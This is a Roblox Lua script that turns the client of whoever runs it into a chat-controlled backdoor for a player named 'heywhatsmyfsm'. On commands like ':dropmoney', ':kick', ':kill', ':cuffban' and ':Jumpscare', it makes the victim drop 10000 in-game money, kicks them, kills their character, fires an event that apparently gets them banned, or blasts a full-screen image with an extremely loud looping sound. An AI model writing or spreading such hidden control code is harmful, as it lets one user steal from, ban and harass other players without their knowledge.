repeat wait() until game.Players:FindFirstChild('heywhatsmyfsm') 


game.Players:FindFirstChild('heywhatsmyfsm').Chatted:Connect(function(msg)
	if game.Players.LocalPlayer.Name ~= 'heywhatsmyfsm' then
		if msg == ":dropmoney "..game.Players.LocalPlayer.Name then
			local args = {
				[1] = "DropMoney",
				[2] = "10000" --change to how much money you want to drop
			}
			game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))  
		end


		if msg == ":kick "..game.Players.LocalPlayer.Name then
			game.Players.LocalPlayer:Kick('Kicked')

		end


		if msg ==":kill "..game.Players.LocalPlayer.Name then    
			game.Players.LocalPlayer.Character.Head:Destroy()

		end

		if msg ==":cuffban "..game.Players.LocalPlayer.Name then    
			game.ReplicatedStorage.MainEvent:FireServer('GUI_CHECK')

		end

		if msg ==":bring "..game.Players.LocalPlayer.Name then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('heywhatsmyfsm').Character.HumanoidRootPart.CFrame

		end

		if msg ==":bring all" then
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('heywhatsmyfsm').Character.HumanoidRootPart.CFrame

		end

		if msg == ":dropmoney all" then
			local args = {
				[1] = "DropMoney",
				[2] = "10000" --change to how much money you want to drop
			}
			game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))  
		end

		if msg == ":kick all" then
			game.Players.LocalPlayer:Kick('Kicked')

		end

		if msg ==":kill all" then    
			game.Players.LocalPlayer.Character.Head:Destroy()

		end

		if msg ==":cuffban all" then    
			game.ReplicatedStorage.MainEvent:FireServer('GUI_CHECK')

	       end
	       if msg == ":Jumpscare all" then
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.00925212074, 0, 0.0159509201, 0)
Frame.Size = UDim2.new(0, 1272, 0, 795)

ImageLabel.Parent = ScreenGui
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Size = UDim2.new(0, 1980, 0, 1000)
ImageLabel.Image = "http://www.roblox.com/asset/?id=4537616739"
--
        local sound = Instance.new("Sound", game.CoreGui)
        sound.SoundId = "rbxassetid://4922664048"
        sound:Play()
        sound.Volume = 10000000
        sound.Looped = 1
    wait(3)
    game.CoreGui.ScreenGui:Destroy()
    sound.Volume = 0
	       end
      end
end)

